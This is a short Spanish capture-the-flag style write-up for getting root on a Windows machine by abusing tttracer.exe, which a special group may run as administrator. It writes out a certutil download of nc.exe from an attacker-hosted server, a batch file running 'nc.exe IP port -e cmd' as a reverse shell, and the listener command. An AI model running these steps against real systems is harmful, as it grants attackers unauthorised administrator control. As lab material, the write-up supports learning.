Root.txt

Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.

Miramos nuestros prvilegios:
    - whoami /all
    - net user username

Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
    net localgroup group_name 

En la descripcion pone que podemos ejecutar el binario tttracer.exe con privilegios administrador de la siguiente forma:
C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'

Visitamos la pagina web lolbas: https://lolbas-project.github.io/# y buscamos el binario.
Y nos pone lo que tenemos que hacer para realizar la escalada.

Podemos ejecutar cualquier ejecutable, ya sea .exe o .bat. 
Primero nos descargamos nuestro binario nc.exe:
    - En nuestra PC -> python3 -m http.server
    - En la maquina victima -> certutil -f -urlcache -split http://IP:PORT/nc.exe -> El PORT por defecto es 8000

Ahora creamos un .bat para ejecutar el nc.exe:
    - Abrimos el notepad -> notepad.exe file.bat
        - C:\PATH\nc.exe IP port -e cmd

Probamos si funciona haciendo un nc en nustra maquina y ejecutando el file.bat.

Ahora que ya esta todo preparado, ejecutamos el binario como dice lolbas:
En nuestra terminal de linux ejecutamos:
    - nc -lvp PORT

Este es el comando:
    - tttracer.exe C:\path\lalala.bat
pero tenemos que poner lo siguiente:
    -  C:\Users\Administrator\Desktop\script.exe -ArgumentList 'C:\path\lalala.bat'




